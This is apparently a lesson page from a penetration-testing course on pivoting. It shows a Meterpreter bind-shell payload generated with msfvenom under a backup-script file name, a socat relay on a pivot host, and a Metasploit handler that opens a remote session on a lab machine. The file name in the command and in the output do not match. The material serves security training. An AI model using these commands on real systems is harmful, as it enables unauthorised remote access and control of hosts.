<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/158/section/1429
// Platform Version: V1
// Module ID: 158
// Module Name: Pivoting, Tunneling, and Port Forwarding
// Module Difficulty: Medium
// Section ID: 1429
// Section Title: Socat Redirection with a Bind Shell
// Page Title: Pivoting, Tunneling, and Port Forwarding
// Page Number: 07
-->

# Socat Redirection with a Bind Shell

**Module Name:** Pivoting, Tunneling, and Port Forwarding **Page Number:** 07

#### PIVOTING, TUNNELING, AND PORT FORWARDING

# Socat Redirection with a Bind Shell

![https://academy.hackthebox.com/storage/modules/158/55.png](https://academy.hackthebox.com/storage/modules/158/55.png)

#### Creating the Windows Payload

``` shell-session
[!bash!]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

#### Starting Socat Bind Shell Listener

``` shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

#### Configuring & Starting the Bind multi/handler

``` shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

#### Establishing Meterpreter Session

``` shell-session
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

# 

# 

#### Questions

####